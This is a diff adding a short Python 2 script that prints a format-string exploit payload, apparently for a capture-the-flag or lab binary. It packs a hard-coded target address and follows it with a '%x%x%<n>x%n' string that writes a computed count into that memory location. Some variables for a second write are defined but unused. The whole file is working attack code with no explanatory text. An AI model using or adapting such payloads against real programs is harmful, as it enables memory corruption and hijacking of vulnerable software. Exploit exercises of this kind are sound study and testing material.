@@ -1,0 +1,14 @@
+#!/usr/bin/python
+
+w1 = '\x14\xc0\x04\x08'
+w2 = '\x14\xc0\x04\x08'
+
+b1 = 0xaa
+b2 = 0xbb
+
+n1 =  b1 - 0x14
+n2 =  b2 - 0x1C
+
+form = '%x%x%' + str(n1) + 'x%n'
+
+print w1 + form
